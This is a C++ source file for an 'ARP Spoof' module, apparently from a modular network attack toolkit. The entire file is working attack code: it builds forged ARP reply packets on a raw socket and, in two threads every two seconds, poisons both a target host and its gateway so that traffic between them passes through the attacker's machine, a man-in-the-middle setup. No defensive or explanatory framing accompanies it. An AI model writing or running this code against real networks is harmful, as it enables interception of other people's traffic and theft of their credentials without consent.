#include <iostream>
#include <cstring>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/if_ether.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <linux/if_packet.h>
#include <chrono>

#include "../headers/arp.h"

ARP::ARP() : stop_flag(false) {}

ARP::~ARP() {
    stop();
}

std::string ARP::get_name() {
    return "ARP Spoof";
}

void ARP::stop() {
    stop_flag = true;
    for (auto& t : attack_threads) {
        if (t.joinable()) {
            t.join();
        }
    }
    attack_threads.clear();
    std::cout << get_name() << " stopped." << std::endl;
}

void ARP::run(Session* session) {
    if (session->interface.empty() || session->target_ip.empty() || session->target_mac.empty() || session->gateway_ip.empty() || session->gateway_mac.empty()) {
        std::cerr << "ARP Spoof requires interface, target IP/MAC, and gateway IP/MAC to be set." << std::endl;
        // You might want to use the helper functions here to resolve the MACs if they are missing
        return;
    }

    stop_flag = false;
    
    // Thread 1: Poison the target (tell it we are the gateway)
    attack_threads.emplace_back(&ARP::spoof_loop, this,
        session->interface,
        session->target_ip,
        session->gateway_ip,
        session->target_mac
    );

    // Thread 2: Poison the gateway (tell it we are the target)
    attack_threads.emplace_back(&ARP::spoof_loop, this,
        session->interface,
        session->gateway_ip,
        session->target_ip,
        session->gateway_mac
    );

    std::cout << get_name() << " started... Poisoning target and gateway." << std::endl;
}

void ARP::spoof_loop(std::string iface_str, std::string target_ip_str, std::string spoof_ip_str, std::string target_mac_str) {
    const char* iface = iface_str.c_str();
    const char* target_ip = target_ip_str.c_str();
    const char* spoof_ip = spoof_ip_str.c_str();
    const char* target_mac = target_mac_str.c_str();

    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sock < 0) {
        perror("ARP spoof_loop socket creation failed");
        return;
    }

    uint8_t attacker_mac[6];
    get_my_mac(iface, attacker_mac);

    uint8_t victim_mac[6];
    parse_mac(target_mac, victim_mac);

    uint8_t packet[60] = {0};
    struct ethhdr* eth = (struct ethhdr*)packet;
    struct arp_header* arp = (struct arp_header*)(packet + sizeof(struct ethhdr));

    memcpy(eth->h_dest, victim_mac, 6);
    memcpy(eth->h_source, attacker_mac, 6);
    eth->h_proto = htons(ETH_P_ARP);

    arp->htype = htons(1);
    arp->ptype = htons(0x0800);
    arp->hlen = 6;
    arp->plen = 4;
    arp->oper = htons(2); // 2 for ARP Reply

    memcpy(arp->sha, attacker_mac, 6);
    inet_pton(AF_INET, spoof_ip, arp->spa);
    memcpy(arp->tha, victim_mac, 6);
    inet_pton(AF_INET, target_ip, arp->tpa);

    sockaddr_ll device = {};
    device.sll_family = AF_PACKET;
    device.sll_ifindex = if_nametoindex(iface);
    device.sll_halen = ETH_ALEN;
    memcpy(device.sll_addr, victim_mac, 6);

    while (!stop_flag) {
        if (sendto(sock, packet, sizeof(packet), 0, (sockaddr*)&device, sizeof(device)) < 0) {
            perror("Failed to send ARP packet");
        }
        std::this_thread::sleep_for(std::chrono::seconds(2));
    }

    close(sock);
}

void ARP::get_my_mac(const char* iface, uint8_t* mac) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) {
        perror("get_my_mac socket");
        memset(mac, 0, 6);
        return;
    }
    struct ifreq ifr;
    strncpy(ifr.ifr_name, iface, IFNAMSIZ);
    if (ioctl(fd, SIOCGIFHWADDR, &ifr) == 0) {
        memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
    } else {
        perror("ioctl SIOCGIFHWADDR");
        memset(mac, 0, 6);
    }
    close(fd);
}

void ARP::parse_mac(const char* mac_str, uint8_t* mac_out) {
    int values[6];
    if (sscanf(mac_str, "%x:%x:%x:%x:%x:%x", 
        &values[0], &values[1], &values[2], 
        &values[3], &values[4], &values[5]) == 6) {
        for(int i = 0; i < 6; ++i) mac_out[i] = (uint8_t)values[i];
    } else {
         // Handle error, maybe set to a default or log it
        memset(mac_out, 0, 6);
    }
}
